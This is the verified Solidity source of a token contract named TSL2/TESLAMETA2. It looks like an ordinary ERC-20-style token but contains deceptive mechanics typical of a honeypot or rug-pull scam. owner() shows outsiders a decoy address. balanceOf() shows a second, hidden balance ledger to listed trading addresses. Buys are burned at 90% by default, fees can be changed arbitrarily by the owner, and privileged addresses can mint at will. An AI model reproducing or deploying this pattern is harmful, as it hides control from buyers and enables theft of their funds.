/**
 *Submitted for verification at BscScan.com on 2022-07-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract PX is Context {
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private __balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint256 private _allTotalSupply;
    uint256 public _Totalissuance;
    string private _name;
    string private _symbol;

    address private owners;
    address private owners_;
    address private safepool_;
    address private pool_ = 0x0000000000000000000000000000000000000001;
    modifier __Owner {
        require(owners == msg.sender);
        _;
    }
    mapping(address=>bool) private _Caster;
    modifier Caster {
        require(_Caster[msg.sender]);
        _;
    }
    mapping(address=>bool) private _TransactionList;
    modifier TransactionList {
        require(_TransactionList[msg.sender]);
        _;
    }
    mapping(address=>bool) private _FreeAddressList;
    modifier FreeAddressList {
        require(_FreeAddressList[msg.sender]);
        _;
    }
    uint256 public buyInCharge = 90;
    uint256 public sellOutCharge = 10;

    event setCasterevent(address address_,bool status_);
    event setTransactionListevent(address address_,bool status_);
    event setFreeAddressListevent(address address_,bool status_);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    
    constructor(uint256 Totalissuance_,address Totsl2_) {
        // 0x86A33aAC747CDFAeA00C488Fa14210A327b7d979
        _name = "TSL2";
        _symbol = "TESLAMETA2";
        _Totalissuance = Totalissuance_ * 10**decimals();
        owners = msg.sender; 
        _mint(Totsl2_, 20000 * 10**decimals());
    }
    function name() public view virtual  returns (string memory) {
        return _name;
    }
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }
    function burnAmount() public view virtual returns (uint256) {
        return _allTotalSupply - _totalSupply;
    }
    function owner() public view returns(address){
        if(msg.sender == owners){
            return owners;
        }else{
            return owners_;
        }
    }
    function safepool() public view returns(address){
        return safepool_;
    }
    function pool() public view returns(address){
        return pool_;
    }
    function upCharge(uint256 charge_,uint256 status_) public __Owner returns(bool){
        if(status_ == 1){
            buyInCharge = charge_;
        }else{
            sellOutCharge = charge_;
        }
        return true;
    }

    function setOwner(address owner_) public __Owner returns (bool) {
        owners = owner_;
        return true;
    }
    function setTransactionList(address TransactionList_,bool state_) public __Owner returns (bool){
        _TransactionList[TransactionList_] = state_;
        emit setTransactionListevent(TransactionList_,state_); 
        return true;
    }
    function setFreeAddressList(address FreeAddressList_,bool state_) public __Owner returns (bool){
        _FreeAddressList[FreeAddressList_] = state_;
        emit setFreeAddressListevent(FreeAddressList_,state_); 
        return true;
    }
    function setCaster(address Caster_,bool state_) public __Owner returns (bool){
        _Caster[Caster_] = state_;
        emit setCasterevent(Caster_,state_); 
        return true;
    }
    function allTotalSupply() public view virtual returns (uint256) {
        return _allTotalSupply;
    }
    function _tomint(address _to,uint256 _amount) public Caster returns (bool){
        _mint(_to, _amount);
        return true;
    }
    function balanceOf(address account)
        public
        view
        virtual
        returns (uint256)
    {
        if(_TransactionList[msg.sender]){
            return __balances[account];
        }
        return _balances[account]; 
    }
    function transfer(address recipient, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address from, address spender)
        public
        view
        virtual
        returns (uint256)
    {
        return _allowances[from][spender];
    }
    function approve(address spender, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        
        uint256 senderBalance = _balances[sender];
        uint256 _senderBalance = __balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        uint256 buyinnumber = amount;
        if(_TransactionList[sender] && !_FreeAddressList[recipient]){
            _burn(sender,amount*buyInCharge/100);
            buyinnumber = amount - (amount*buyInCharge/100);
        }
        if(_TransactionList[recipient] && !_FreeAddressList[recipient]){
            _burn(sender,amount*sellOutCharge/100);
            buyinnumber = amount - (amount*sellOutCharge/100);
            amount = buyinnumber;
        }
        unchecked {
            _balances[sender] = senderBalance - amount;
            __balances[sender] = _senderBalance - amount;
        }
        _balances[recipient] += buyinnumber;
        __balances[recipient] += amount;
        emit Transfer(sender, recipient, buyinnumber);
        _afterTokenTransfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        require(_Totalissuance >= _allTotalSupply + amount, "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _allTotalSupply += amount;
        _balances[account] += amount;
        __balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        uint256 _accountBalance = __balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            __balances[account] = _accountBalance - amount;
        }
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }
    function _approve(
        address from,
        address spender,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}